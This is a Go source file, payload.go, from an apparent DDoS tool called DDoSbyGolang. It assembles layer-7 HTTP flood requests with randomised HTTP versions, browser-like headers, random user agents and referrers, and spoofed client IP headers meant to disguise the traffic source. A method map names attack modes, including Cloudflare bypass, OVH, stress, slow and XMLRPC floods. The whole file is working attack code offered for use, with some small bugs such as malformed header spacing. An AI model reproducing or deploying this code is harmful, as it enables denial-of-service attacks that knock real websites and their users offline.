/*
 * @Author: uyplayer
 * @Date: 2022/3/26 13:46
 * @Email: uyplayer@qq.com
 * @File: payload.go
 * @Software: GoLand
 * @Dir: DDoSbyGolang / layer7
 * @Project_Name: DDoSbyGolang
 * @Description:
 */

package layer7

import (
	"DDoSbyGolang/common"
	"bufio"
	"fmt"
	"io"
	"math/rand"
	"net/url"
	"os"
	"strings"
	"time"
)

//
//  generatePayload
//  @Description: 形成payload
//
func generatePayload(otherPayload string, work Work) string {
	wUrl, err := url.Parse(work.Url)
	if err != nil {
		common.Error.Println("  url.Parse(work.Url) : ", err)
	}
	payload := defaultPayload(work) + payload(work)
	payload = payload + fmt.Sprintf("Host: %s\r\n", wUrl.Host)
	payload = payload + generateRandHeader(work)
	if otherPayload != "" {
		payload = payload + otherPayload
	}
	return payload
}

//
//  defaultPayload 请求首行形成
//  @Description:
//  @param urlAadd
//  @param method
//  @return string
//
func defaultPayload(work Work) string {

	version := []string{
		"1.0", "1.1", "1.2",
	}
	// 形成随机数
	rand.Seed(time.Now().UnixNano())
	any := rand.Intn(3)
	v := version[any]

	// url 解释
	r, err := url.Parse(work.Url)
	if err != nil {
		common.Error.Println(" url 解释 : ", err)
	}

	return fmt.Sprintf("%s %s HTTP/%s\r\n", getMethodType(work), r.Path, v)
}

//
//  payload
//  @Description: 请求头信息
//  @return string
//
func payload(work Work) string {

	payload := "Accept-Encoding: gzip, deflate, br\r\n " +
		"Accept-Language: en-US,en;q=0.9\r\n " +
		"Cache-Control: max-age=0\r\n " +
		"Connection: Keep-Alive\r\n" +
		"Sec-Fetch-Dest: document\r\n" +
		"Sec-Fetch-Mode: navigate\r\n" +
		"Sec-Fetch-Site: none\r\n" +
		"Sec-Fetch-User: ?1\r\n" +
		"Sec-Gpc: 1\r\n" +
		"Pragma: no-cache\r\n" +
		"Upgrade-Insecure-Requests: 1\r\n"

	return payload

}

//
//  randHeadercontent
//  @Description:
//  @return string()
//
func generateRandHeader(work Work) string {
	payload := fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
	payload = payload + fmt.Sprintf("Referrer: %s%s\r\n", generateReferrer(), url.QueryEscape(work.Target))
	payload = payload + generateSpoofIP(work)
	return payload
}

//
//  spoofIP
//  @Description: ip欺骗
//
func generateSpoofIP(work Work) string {
	wUrl, err := url.Parse(work.Url)
	if err != nil {
		common.Error.Println(" url.Parse(work.Url) :  ", err)
	}
	spoof := generateIpaddr()
	payload := "X-Forwarded-Proto: Http\r\n"
	payload = payload + fmt.Sprintf("X-Forwarded-Host: %s, 1.1.1.1\r\n", wUrl.Host)
	payload = payload + fmt.Sprintf("Via: %s\r\n", spoof)
	payload = payload + fmt.Sprintf("Client-IP: %s\r\n", spoof)
	payload = payload + fmt.Sprintf("X-Forwarded-For: %s\r\n", spoof)
	payload = payload + fmt.Sprintf("Real-IP: %s\r\n", spoof)
	return payload

}

//
//  generateReferrer
//  @Description: 获取Refer
//  @return string
//
func generateReferrer() string {
	// 形成随机数
	rand.Seed(time.Now().UnixNano())
	// 打开useragent文件
	openFile, err := os.Open("/Users/uyplayer/Projects/Gopath/src/DDoSbyGolang/files/referers.txt")
	defer openFile.Close()
	if err != nil {
		common.Error.Fatalln(err)
	}

	// 需要一行行读出
	var referes []string
	bf := bufio.NewReader(openFile)
	for {
		// 返回新的读出的对象
		line, _, err := bf.ReadLine()
		if err != nil {
			if err == io.EOF {
				break
			}
		}

		referes = append(referes, string(line))
	}
	// 随机数
	any := rand.Intn(len(referes))
	return referes[any]

}

//
//  genIpaddr
//  @Description: 形成ip地址
//  @return string
//
func generateIpaddr() string {
	// 随机化
	rand.Seed(time.Now().Unix())
	ip := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
	return ip
}

//
//  getMethodType
//  @Description: 获取method type
//  @param work
//  @return string
//
func getMethodType(work Work) string {
	methods := strings.ToUpper(work.Method)
	m := map[string]string{
		"CFB": "GET", "CFBUAM": "GET", "GET": "GET", "COOKIE": "GET", "OVH": "GET", "EVEN": "GET",
		"STRESS": "GET", "DYN": "GET", "SLOW": "GET", "PPS": "GET", "APACHE": "GET",
		"BOT": "GET", "POST": "POST", "XMLRPC": "POST", "GSB": "HEAD", "HEAD": "HEAD",
	}
	if ok, err := m[methods]; err == true {
		return ok
	} else {

		return "REQUESTS"
	}

}

//
//  generateBytes
//  @Description: 形成bytes
//  @param l
//
func generateBytes(l int) string {
	data := map[int]string{
		0: "0", 1: "2", 3: "3", 4: "4", 5: "5", 6: "6", 7: "7", 8: "8", 9: "9", 10: "a",
		11: "a", 12: "b", 13: "c", 14: "d", 15: "e", 16: "f", 17: "g", 18: "h", 19: "i", 20: "j", 21: "k", 22: "l", 23: "m", 24: "n", 25: "o", 26: "p", 27: "q", 28: "r", 29: "s", 30: "t", 31: "u", 32: "v", 33: "w", 34: "x", 35: "y", 36: "z", 37: "A", 38: "B", 39: "C", 40: "D", 41: "E", 42: "F", 43: "G", 44: "H", 45: "I", 46: "J", 47: "K", 48: "L", 49: "M", 50: "N", 51: "O", 52: "P", 53: "Q", 54: "R", 55: "S", 56: "T", 57: "U", 58: "V", 59: "W", 60: "X", 61: "Y", 62: "Z",
	}
	rand.Seed(time.Now().Unix())
	s := ""
	for i := 0; i < l; i++ {
		rNum := rand.Intn(63)
		s = s + data[rNum]
	}

	return s

}
